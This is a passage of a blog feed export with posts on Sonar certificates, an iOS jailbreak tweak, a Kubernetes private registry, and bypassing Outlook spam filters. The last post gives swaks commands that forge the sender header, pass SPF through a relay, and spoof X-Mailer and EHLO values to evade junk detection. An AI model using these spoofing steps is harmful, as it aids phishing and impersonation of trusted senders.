&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To check the merge request scanning status, we need to enable the option below in the Gitlab:</p>
<img src="/2021/08/04/Sonar-Code-Quality-Gate-Integration-with-CI-Part-2/pic_11.png" width="100%" height="100%">

<p>If the merge request was triggered, the merge request status will be limited unless the CI pipeline succeeds a moment later.</p>
<img src="/2021/08/04/Sonar-Code-Quality-Gate-Integration-with-CI-Part-2/pic_12.png" width="100%" height="100%">

<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://docs.gitlab.com/ee/integration/jenkins.html#grant-jenkins-access-to-gitlab-project">https://docs.gitlab.com/ee/integration/jenkins.html#grant-jenkins-access-to-gitlab-project</a></p>
<p><a href="https://about.gitlab.com/handbook/customer-success/demo-systems/tutorials/integrations/create-jenkins-pipeline/">https://about.gitlab.com/handbook/customer-success/demo-systems/tutorials/integrations/create-jenkins-pipeline/</a></p>
]]></content>
      <categories>
        <category>SAST</category>
      </categories>
      <tags>
        <tag>sonarqube</tag>
        <tag>sonar-scanner</tag>
        <tag>Jenkins</tag>
        <tag>Gitlab</tag>
      </tags>
  </entry>
  <entry>
    <title>Sonar Code Quality Gate Integration with CI - Part 3</title>
    <url>/2021/09/18/Sonar-Code-Quality-Gate-Integration-with-CI-Part-3/</url>
    <content><![CDATA[<h2 id="Certificate-Generation"><a href="#Certificate-Generation" class="headerlink" title="Certificate Generation"></a>Certificate Generation</h2><p>The default sonarqube service runs as HTTP service, we’re going to generate our self-signed certificate. Since I’ve been deploying the sonarqube service through kubernetes with nginx as ingress, I just use self-signed certificate for convenience. Besides this, you can also try out the <a href="https://letsencrypt.org/">Let’s Encrypt</a> tool to generate the browser-recognized certificate, the nginx ingress supports this way well.</p>
<p>The <em>san.cnf</em> configuration file is necessary for generating the certificate which will be used by the sonar scanner SSL verification procedure. If you want your certificates to support Subject Alternative Names (SANs), you must define the alternative names in a configuration file.</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[req]</span></span><br><span class="line"><span class="attr">default_bits</span>  = <span class="number">2048</span></span><br><span class="line"><span class="attr">distinguished_name</span> = req_distinguished_name</span><br><span class="line"><span class="attr">req_extensions</span> = req_ext</span><br><span class="line"><span class="attr">x509_extensions</span> = v3_req</span><br><span class="line"><span class="attr">prompt</span> = <span class="literal">no</span></span><br><span class="line"></span><br><span class="line"><span class="section">[req_distinguished_name]</span></span><br><span class="line"><span class="attr">countryName</span> = XX</span><br><span class="line"><span class="attr">stateOrProvinceName</span> = N/A</span><br><span class="line"><span class="attr">localityName</span> = N/A</span><br><span class="line"><span class="attr">organizationName</span> = XX</span><br><span class="line"><span class="attr">commonName</span> = www.example.com</span><br><span class="line"></span><br><span class="line"><span class="section">[req_ext]</span></span><br><span class="line"><span class="attr">subjectAltName</span> = @alt_names</span><br><span class="line"><span class="section">[v3_req]</span></span><br><span class="line"><span class="attr">subjectAltName</span> = @alt_names</span><br><span class="line"><span class="section">[alt_names]</span></span><br><span class="line"><span class="attr">DNS.1</span> = www.example.com</span><br><span class="line"><span class="attr">IP.1</span> = x.x.x.x</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 730 -out cert.pem -config san.cnf</span><br></pre></td></tr></table></figure>

<h2 id="Truststore-Generation"><a href="#Truststore-Generation" class="headerlink" title="Truststore Generation"></a>Truststore Generation</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -trustcacerts -keystore truststore.jks -alias abc -import -file cert.pem</span><br></pre></td></tr></table></figure>

<p>You can still import other certificates as you need.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -importcert -keystore /path/truststore.jks -storepass password -file ./example.com.cer</span><br></pre></td></tr></table></figure>

<p>Set the sonar environment variables to invoke the truststore file.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export SONAR_SCANNER_OPTS=&quot;-Djavax.net.ssl.trustStore=/path/truststore.jks -Djavax.net.ssl.trustStorePassword=changeit&quot;</span><br></pre></td></tr></table></figure>

<p>The sonar scanner will work normally then.</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="http://doc.isilon.com/ECS/3.2/AdminGuide/ecs_t_certificate_generate_with_san.html">http://doc.isilon.com/ECS/3.2/AdminGuide/ecs_t_certificate_generate_with_san.html</a></p>
<p><a href="https://stackoverflow.com/questions/47434877/how-to-generate-keystore-and-truststore">https://stackoverflow.com/questions/47434877/how-to-generate-keystore-and-truststore</a></p>
<p><a href="https://sionwilliams.com/posts/2019-04-25_sonar_scanner_certs/">https://sionwilliams.com/posts/2019-04-25_sonar_scanner_certs/</a></p>
]]></content>
      <categories>
        <category>SAST</category>
      </categories>
      <tags>
        <tag>sonarqube</tag>
        <tag>sonar-scanner</tag>
        <tag>Jenkins</tag>
        <tag>Gitlab</tag>
      </tags>
  </entry>
  <entry>
    <title>The Experiment of Tweak for iOS</title>
    <url>/2018/11/20/The-Experiment-of-Tweak-for-iOS/</url>
    <content><![CDATA[<h2 id="Tweak-for-what"><a href="#Tweak-for-what" class="headerlink" title="Tweak for what?"></a>Tweak for what?</h2><p>You can make a choice of whatever you want to add a tweak on iOS. For me, I started with the SpringBoard of iOS. So, what is SpringBoard? SpringBoard is the application that manages the home screen on iOS devices. Essentially SpringBoard is like the mobile version of a desktop. Mac OS X features the Finder while Windows computers have the Explorer. And what does the tweak affect? This tweak works when the user triggers a respring(A respring restarts the user interface (SpringBoard) of the iOS operating system. The main difference between a restart and a respring is that a respring doesn’t switch off the system.).</p>
<h2 id="Get-the-environment-ready"><a href="#Get-the-environment-ready" class="headerlink" title="Get the environment ready"></a>Get the environment ready</h2><p>The framework I used during the tweak development is Theos(<a href="https://github.com/theos/theos">https://github.com/theos/theos</a>), an efficient and powerful framework. It’s simple to clone the project and execute the <em>chmod</em> directive, so I omit that here and come to the steps different from the old version of Theos.</p>
<p>Install dpkg and ldid which is used to sign your package instead of codesign in Xcode.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">brew install dpkg ldid</span><br></pre></td></tr></table></figure>
<p>If you don’t have Homebrew, you just need one command to get it and then you’re good to go.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br></pre></td></tr></table></figure>
<p>The operation of <em>sudo /opt/theos/bin/bootstrap.sh substrate</em> is not needed with the latest version of Theos. When everything is done, remember to set the<br>environment variables:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export THEOS=/opt/theos</span><br><span class="line">export PATH=/opt/theos/bin/:$PATH</span><br><span class="line">export THEOS_MAKE_PATH=$THEOS/makefiles</span><br></pre></td></tr></table></figure>
<p>All the preparations have been finished, we can now dive into the interesting section.</p>
<h2 id="Functions-hooking"><a href="#Functions-hooking" class="headerlink" title="Functions hooking"></a>Functions hooking</h2><p>I post the final result appears on my device here:<br><img src="/2018/11/20/The-Experiment-of-Tweak-for-iOS/pic_1.png" width="60%" height="60%"><br>Apple has given many APIs for AppStore developers, but it’s not enough compared to the mammoth APIs which can be exposed on the jailbroken device. When it comes to developing tweaks, it’s actually changing the behavior by hooking functions. But it’s not easy to find out how the functionality implemented among the code. In fact, it takes lots of time to figure out the logic of the substrate. I just implement the common work supplied by other people.</p>
<h3 id="Generate-a-template"><a href="#Generate-a-template" class="headerlink" title="Generate a template."></a>Generate a template.</h3><p>Type nic.pl and choose an option from the given list. We want to generate a tweak template, so input 13. Then finish the following information.<br><img src="/2018/11/20/The-Experiment-of-Tweak-for-iOS/pic_2.png" width="100%" height="100%"><br>When you see the output of “Done.”, there will be 4 files generated under your working directory: </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Makefile    commonproject.plist    Tweak.xm    control</span><br></pre></td></tr></table></figure>

<h3 id="Modify-files-as-you-need"><a href="#Modify-files-as-you-need" class="headerlink" title="Modify files as you need"></a>Modify files as you need</h3><p><em>Makefile</em> is generally used in most projects to get everything done properly. In our project, it used to point out files, libraries and frameworks we need.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">THEOS_DEVICE_IP = 10.1.2.34</span><br><span class="line">ARCHS = armv7 arm64</span><br><span class="line">TARGET = iphone:latest:8.0</span><br><span class="line">include $(THEOS)/makefiles/common.mk</span><br><span class="line"></span><br><span class="line">TWEAK_NAME = commonproject</span><br><span class="line">commonproject_FILES = Tweak.xm</span><br><span class="line">commonproject_FRAMEWORKS = UIKit</span><br><span class="line"></span><br><span class="line">include $(THEOS_MAKE_PATH)/tweak.mk</span><br><span class="line"></span><br><span class="line">after-install::</span><br><span class="line">        install.exec &quot;killall -9 SpringBoard&quot;</span><br></pre></td></tr></table></figure>
<p>We write our code about functions hooking and other useful snippets in the  <em>Tweak.xm</em> file.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">hook SpringBoard</span></span><br><span class="line">  </span><br><span class="line">// Hooking an instance method with an argument.</span><br><span class="line">- (void)applicationDidFinishLaunching:(id)application &#123;</span><br><span class="line"></span><br><span class="line">        %orig; // Call through to the original function with its original arguments.</span><br><span class="line">        UIAlertView *alert = [[UIAlertView alloc]initWithTitle:@&quot;此广告位常年招商&quot; message:nil delegate:self cancelButtonTitle:@&quot;OK&quot;otherButtonTitles:nil];</span><br><span class="line">        [alert show];</span><br><span class="line">        [alert release];</span><br><span class="line"></span><br><span class="line">        // If you use %orig(), you MUST supply all arguments (except for self and _cmd, the automatically generated ones.)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Always make sure you clean up after yourself; Not doing so could have grave consequences!</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">end</span></span><br></pre></td></tr></table></figure>
<p>The <em>control</em> file contains the basic information of your deb package, all of them will be packed in your deb package.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Package: apple</span><br><span class="line">Name: commonproject</span><br><span class="line">Depends: mobilesubstrate</span><br><span class="line">Version: 0.0.1</span><br><span class="line">Architecture: iphoneos-arm</span><br><span class="line">Description: iOS tweak learning.</span><br><span class="line">Maintainer: z</span><br><span class="line">Author: z</span><br><span class="line">Section: Tweaks</span><br><span class="line">Homepage: http://recursively.review</span><br></pre></td></tr></table></figure>
<p>The *.plist file contains the configuration of your package.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123; Filter = &#123; Bundles = ( &quot;com.apple.springboard&quot; ); &#125;; &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Install-your-package"><a href="#Install-your-package" class="headerlink" title="Install your package"></a>Install your package</h3><p>Next, we need to install our package onto the iOS device with directive <em>make package install</em> remotely through the ssh. But firstly, you should have installed OpenSSH. You need to input your password of ssh twice during the installation process. If no errors prompt out you can respring your iOS device and easily see the result I’ve shown above.</p>
<h2 id="Sources"><a href="#Sources" class="headerlink" title="Sources"></a>Sources</h2><p><em>iOS App Reverse Engineering</em></p>
]]></content>
      <categories>
        <category>Reverse Engineering</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Theos</tag>
      </tags>
  </entry>
  <entry>
    <title>The Kubernetes Image Pulling Modifications</title>
    <url>/2021/08/20/The-Kubernetes-Image-Pulling-Modifications/</url>
    <content><![CDATA[<h2 id="Set-up-the-CRI-Proxy"><a href="#Set-up-the-CRI-Proxy" class="headerlink" title="Set up the CRI Proxy"></a>Set up the CRI Proxy</h2><p>Set up the proxy for the CRI(Container Runtime Interface) will solve the connection problem in most situations. Considering most of people use docker to pull the container images and docker has containerd which is also a CRI, we can create configuration files and add some parameters.</p>
<p>Create the docker configuration file:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /etc/systemd/system/docker.service.d</span><br><span class="line">touch /etc/systemd/system/docker.service.d/http-proxy.conf</span><br></pre></td></tr></table></figure>
<p>Modify the <em>http-proxy.conf</em> file:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Environment=&quot;HTTP_PROXY=http://x.x.x.x&quot;</span><br><span class="line">Environment=&quot;HTTPS_PROXY=http://x.x.x.x&quot;</span><br><span class="line">Environment=&quot;NO_PROXY=172.20.1.150&quot;</span><br></pre></td></tr></table></figure>

<p>Create the containerd configuration file:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /etc/systemd/system/containerd.service.d</span><br><span class="line">touch /etc/systemd/system/containerd.service.d/http-proxy.conf</span><br></pre></td></tr></table></figure>
<p>Modify the <em>http-proxy.conf</em> file:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Environment=&quot;HTTP_PROXY=http://x.x.x.x&quot;</span><br><span class="line">Environment=&quot;HTTPS_PROXY=http://x.x.x.x&quot;</span><br><span class="line">Environment=&quot;NO_PROXY=172.20.1.150&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Set-up-Private-Registry"><a href="#Set-up-Private-Registry" class="headerlink" title="Set up Private Registry"></a>Set up Private Registry</h2><p>For security concerns, it will be better to create a private registry with authentication. Here I’m going to use the basic authentication to achieve that.</p>
<p>Create a password file with one entry for the user testuser, with password testpassword:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir auth</span><br><span class="line">docker run --rm \</span><br><span class="line">  --entrypoint htpasswd \</span><br><span class="line">  httpd:2 -Bbn testuser testpassword &gt; auth/htpasswd</span><br></pre></td></tr></table></figure>
<p>We’re going to use the TLS channel to access the registry server, so we have to generate the certificate ourselves. Otherwise you can use the <em>insecure-registries</em> parameter to bypass the HTTPS warning. Edit the <em>daemon.json</em> file, whose default location is /etc/docker/daemon.json on Linux:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;insecure-registries&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;myregistrydomain.com:5000&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>Let’s create the certificate and key file:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir certs &amp;&amp; cd ./certs</span><br><span class="line">openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem -subj &quot;/CN=example.com&quot; -addext &quot;subjectAltName = DNS:example.com&quot;</span><br></pre></td></tr></table></figure>
<p>Install the certificate for your local machine, but it seems that docker will not refer to the Linux certificates when it connects to the registry.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp certs/certificate.pem /usr/local/share/ca-certificates/registry-certificate.crt</span><br><span class="line">sudo update-ca-certificates</span><br></pre></td></tr></table></figure>
<p>Now we’ve install the self-signed certificate properly. Note that if you want to enable the deleting switch which allows you to delete the images on the registry, you need to create a yaml file and edit it like this: </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="number">0.1</span></span><br><span class="line"><span class="attr">log:</span></span><br><span class="line">  <span class="attr">fields:</span></span><br><span class="line">    <span class="attr">service:</span> <span class="string">registry</span></span><br><span class="line"><span class="attr">storage:</span></span><br><span class="line">  <span class="attr">delete:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">blobdescriptor:</span> <span class="string">inmemory</span></span><br><span class="line">  <span class="attr">filesystem:</span></span><br><span class="line">    <span class="attr">rootdirectory:</span> <span class="string">/var/lib/registry</span></span><br><span class="line"><span class="attr">http:</span></span><br><span class="line">  <span class="attr">addr:</span> <span class="string">localhost:5000</span></span><br><span class="line">  <span class="attr">headers:</span></span><br><span class="line">    <span class="attr">X-Content-Type-Options:</span> [<span class="string">nosniff</span>]</span><br><span class="line"><span class="attr">health:</span></span><br><span class="line">  <span class="attr">storagedriver:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="string">10s</span></span><br><span class="line">    <span class="attr">threshold:</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>Let’s start the registry with basic authentication:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  --name registry \</span><br><span class="line">  -v &quot;$(pwd)&quot;/config.yml:/etc/docker/registry/config.yml \</span><br><span class="line">  -v /data/registry:/var/lib/registry \</span><br><span class="line">  -v &quot;$(pwd)&quot;/auth:/auth \</span><br><span class="line">  -e &quot;REGISTRY_AUTH=htpasswd&quot; \</span><br><span class="line">  -e &quot;REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm&quot; \</span><br><span class="line">  -e REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd \</span><br><span class="line">  -v &quot;$(pwd)&quot;/certs:/certs \</span><br><span class="line">  -e REGISTRY_HTTP_ADDR=0.0.0.0:443 \</span><br><span class="line">  -e REGISTRY_HTTP_TLS_CERTIFICATE=/certs/certificate.pem \</span><br><span class="line">  -e REGISTRY_HTTP_TLS_KEY=/certs/key.pem \</span><br><span class="line">  -p 6000:443 \</span><br><span class="line">  registry</span><br></pre></td></tr></table></figure>

<p>Connection test:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -XGET https://localhost:6000/v2/_catalog -u reporter:58fd24d4311a742d13464373398ff3d9</span><br></pre></td></tr></table></figure>

<p>Maybe you have to modify the image pulling credentials in your kubernetes yaml file.</p>
<p>Create a secret named regcred:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl create secret docker-registry regcred \</span><br><span class="line">  --docker-server=&lt;your-registry-server&gt; \</span><br><span class="line">  --docker-username=&lt;your-name&gt; \</span><br><span class="line">  --docker-password=&lt;your-pword&gt; \</span><br><span class="line">  --docker-email=&lt;your-email&gt;</span><br></pre></td></tr></table></figure>

<p>And add the credential in your pod:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: private-reg</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - name: private-reg-container</span><br><span class="line">    image: &lt;your-private-image&gt;</span><br><span class="line">  imagePullSecrets:</span><br><span class="line">  - name: regcred</span><br></pre></td></tr></table></figure>

<p>If you are using a virtual machine manager for kubernetes like kubevirt, it will be a little different:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volumes:</span><br><span class="line">  - name: containervolume</span><br><span class="line">    containerDisk:</span><br><span class="line">      image: &lt;your-private-image&gt;</span><br><span class="line">      imagePullSecret: regcred</span><br></pre></td></tr></table></figure>

<h3 id="Push-Images"><a href="#Push-Images" class="headerlink" title="Push Images"></a>Push Images</h3><p>Since we have enabled the basic authentication, you have to execute the login command first and foremost.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker login http://172.20.1.150:6000</span><br></pre></td></tr></table></figure>
<p>After entering your username and password, the <em>~/.docker/config.json</em> file will be generated automatically. </p>
<p>Then you can push your images to the registry by a few commands:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker image tag rhel-httpd:latest registry-host:6000/myadmin/rhel-httpd:latest</span><br><span class="line"></span><br><span class="line">docker image push registry-host:6000/myadmin/rhel-httpd:latest</span><br></pre></td></tr></table></figure>

<h3 id="Image-Deleting"><a href="#Image-Deleting" class="headerlink" title="Image Deleting"></a>Image Deleting</h3><p>Commonly we get all the images kept on the registry by using the v2 api:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -XGET https://localhost:6000/v2/_catalog -u name:password --insecure</span><br><span class="line">curl -XGET https://localhost:6000/v2/&lt;name&gt;/tags/list -u name:password --insecure</span><br></pre></td></tr></table></figure>
<p>We can also list all the images along with their tags with a python script:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">repo_ip = <span class="string">&#x27;172.20.1.150&#x27;</span></span><br><span class="line">repo_port = <span class="number">6000</span></span><br><span class="line">auth_name = <span class="string">&#x27;name&#x27;</span></span><br><span class="line">auth_password = <span class="string">&#x27;password&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getImagesNames</span>(<span class="params">repo_ip,repo_port</span>):</span><br><span class="line">    docker_images = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">&quot;https://&quot;</span> + repo_ip + <span class="string">&quot;:&quot;</span> +<span class="built_in">str</span>(repo_port) + <span class="string">&quot;/v2/_catalog&quot;</span></span><br><span class="line">        res =requests.get(url, auth=(auth_name, auth_password)).content.strip()</span><br><span class="line">        res_dic = json.loads(res)</span><br><span class="line">        images_type = res_dic[<span class="string">&#x27;repositories&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> images_type:</span><br><span class="line">            url2 = <span class="string">&quot;https://&quot;</span> + repo_ip + <span class="string">&quot;:&quot;</span> +<span class="built_in">str</span>(repo_port) +<span class="string">&quot;/v2/&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;/tags/list&quot;</span></span><br><span class="line">            res2 = requests.get(url2, auth=(auth_name, auth_password)).content.strip()</span><br><span class="line">            res_dic2 = json.loads(res2)</span><br><span class="line">            name = res_dic2[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">            tags = res_dic2[<span class="string">&#x27;tags&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> tags:</span><br><span class="line">                <span class="keyword">for</span> tag <span class="keyword">in</span> tags:</span><br><span class="line">                    docker_name = <span class="built_in">str</span>(repo_ip) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(repo_port) + <span class="string">&quot;/&quot;</span> + name + <span class="string">&quot;:&quot;</span> + tag</span><br><span class="line">                    docker_images.append(docker_name)</span><br><span class="line">                    <span class="built_in">print</span>(docker_name)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> docker_images</span><br><span class="line"></span><br><span class="line">getImagesNames(repo_ip, repo_port)</span><br></pre></td></tr></table></figure>
<p>Run this script:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 get_image.py</span><br></pre></td></tr></table></figure>

<p>We can use the v2 api to delete a specific image:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -XDELETE https://localhost:6000/v2/&lt;name&gt;/manifests/&lt;reference&gt; -u name:password</span><br></pre></td></tr></table></figure>

<p>For example:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -XDELETE https://localhost:6000/v2/&lt;name&gt;/manifests/sha256:60f2883fbfca71ff7740a6eca7bd8bd466988031dcf55093bb8ff2b26f2c5479 -u name:password --insecure</span><br></pre></td></tr></table></figure>

<p>The name is the image name you want to delete, and the reference is the digest of the targeted image. To get the digest of a image with docker:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker image ls --digests image_name</span><br></pre></td></tr></table></figure>

<p>Or retrieve the digest from the registry server with command:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X GET --header &quot;Accept: application/vnd.docker.distribution.manifest.v2+json&quot; -I </span><br><span class="line">http://x.x.x.x:5000/v2/</span><br></pre></td></tr></table></figure>

<p>For example:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -XGET --header &quot;Accept: application/vnd.docker.distribution.manifest.v2+json&quot; -I https://localhost:6000/v2/&lt;name&gt;/manifests/latest -u name:password --insecure</span><br></pre></td></tr></table></figure>

<p>The response will be like this:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">HTTP/2 200</span><br><span class="line">content-type: application/vnd.docker.distribution.manifest.v2+json</span><br><span class="line">docker-content-digest: sha256:60f2883fbfca71ff7740a6eca7bd8bd466988031dcf55093bb8ff2b26f2c5479</span><br><span class="line">docker-distribution-api-version: registry/2.0</span><br><span class="line">etag: &quot;sha256:60f2883fbfca71ff7740a6eca7bd8bd466988031dcf55093bb8ff2b26f2c5479&quot;</span><br><span class="line">x-content-type-options: nosniff</span><br><span class="line">content-length: 1582</span><br><span class="line">date: Sat, 18 Sep 2021 03:37:20 GMT</span><br></pre></td></tr></table></figure>

<p>Finally, to make the deleting action take effect, you need to get into the container and execute the garbage-collection command:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">registry garbage-collect /etc/docker/registry/config.yml</span><br></pre></td></tr></table></figure>
<p>Then you can check the storage to verify:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">du -chs /var/lib/registry/</span><br></pre></td></tr></table></figure>

<h2 id="Using-the-Cloud-Service-Provider’s-Registry"><a href="#Using-the-Cloud-Service-Provider’s-Registry" class="headerlink" title="Using the Cloud Service Provider’s Registry"></a>Using the Cloud Service Provider’s Registry</h2><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://docs.docker.com/registry/insecure/">https://docs.docker.com/registry/insecure/</a></p>
<p><a href="https://docs.docker.com/registry/deploying/">https://docs.docker.com/registry/deploying/</a></p>
<p><a href="https://docs.docker.com/registry/spec/api/">https://docs.docker.com/registry/spec/api/</a></p>
]]></content>
      <categories>
        <category>Cloud</category>
      </categories>
      <tags>
        <tag>kubernetes</tag>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>The Spam Filters Bypassing</title>
    <url>/2019/12/04/The-Spam-Filters-Bypassing/</url>
    <content><![CDATA[<p>Due to some imperfections of the SMTP protocol, the email can be forged by malicious attackers. For example, the email sender and the email title can be modified to whatever they want. But some high-security mailboxes are able to identify the malicious email and tag it as junk email or spam. </p>
<p>I’d like to use the swaks tool to forge the email. It provides many easy ways to modify elements of the email source. But I faced many problems when I tried to bypass the Outlook spam filter.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">swaks --to xxx@live.com --from admin@qq.com --body body.txt</span><br></pre></td></tr></table></figure>

<p>This email was detected as spam. If you take a look at the email source you will see that the SPF authentication was failed.</p>
<img src="/2019/12/04/The-Spam-Filters-Bypassing/pic_11.png" width="60%" height="60%">

<p>SPF is an email authentication protocol that allows the owner of a domain to specify which mail servers they use to send mail from that domain. SPF records list which IP addresses are authorized to send emails on behalf of their domains. You can find more details in this blog: <a href="https://blog.returnpath.com/how-to-explain-spf-in-plain-english/">https://blog.returnpath.com/how-to-explain-spf-in-plain-english/</a>. In order to bypass the SPF auth, I used a third-party email-sending service named smtp2go. And there is something important to say, email messages contain two “from” addresses: the “envelope from” and the “header from”. This feature allows us to pass the SPF authentication by keeping the “envelope from” address.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">swaks --to xxx@live.com --from xx@smtp2go.com --h-From: &#x27;admin&lt;admin@qq.com&gt;&#x27;  --body body.txt --server mail.smtp2go.com -p 2525 -au xxx -ap xxx</span><br></pre></td></tr></table></figure>

<p>But This email was tagged as junk email by Outlook. Let’s take a look at the email source and we will see that the SPF authentication is passed. </p>
<img src="/2019/12/04/The-Spam-Filters-Bypassing/pic_5.png" width="60%" height="60%">

<p>I searched the keyword “swaks” and saw the X-Mailer parameter is suspicious. </p>
<img src="/2019/12/04/The-Spam-Filters-Bypassing/pic_12.png" width="60%" height="60%">

<p>I changed the value of the X-Mailer parameter and resent the email.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">swaks --header-X-Mailer smtp2go.com --to xxx@live.com --from xx@smtp2go.com --h-From: &#x27;admin&lt;admin@qq.com&gt;&#x27;  --body body.txt --server mail.smtp2go.com -p 2525 -au xxx -ap xxx</span><br></pre></td></tr></table></figure>

<p>The email was also detected as junk email. When I browsed the email source I found the abbreviation for the reason that email being detected as spam.</p>
<img src="/2019/12/04/The-Spam-Filters-Bypassing/pic_2.png" width="60%" height="60%">

<img src="/2019/12/04/The-Spam-Filters-Bypassing/pic_3.png" width="60%" height="60%">

<p>More details: <a href="https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spam-message-headers">https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spam-message-headers</a></p>
<img src="/2019/12/04/The-Spam-Filters-Bypassing/pic_4.png" width="60%" height="60%">

<p>But I didn’t find any description of that abbreviation. This problem has been discussed in this issue: <a href="https://github.com/MicrosoftDocs/OfficeDocs-o365seccomp/issues/211">https://github.com/MicrosoftDocs/OfficeDocs-o365seccomp/issues/211</a>. The strange thing is this issue was closed without giving any answer. :)</p>
<p>I searched other features and I noticed that the helo authentication is kali. </p>
<img src="/2019/12/04/The-Spam-Filters-Bypassing/pic_6.png" width="60%" height="60%">

<p>I added an argument to modify the helo authentication value. </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">swaks --header-X-Mailer smtp2go.com --to xxx@live.com --from xx@smtp2go.com --h-From: &#x27;admin&lt;admin@qq.com&gt;&#x27;  --body body.txt --ehlo qq.com --server mail.smtp2go.com -p 2525 -au xxx -ap xxx</span><br></pre></td></tr></table></figure>

<img src="/2019/12/04/The-Spam-Filters-Bypassing/pic_7.png" width="60%" height="60%">

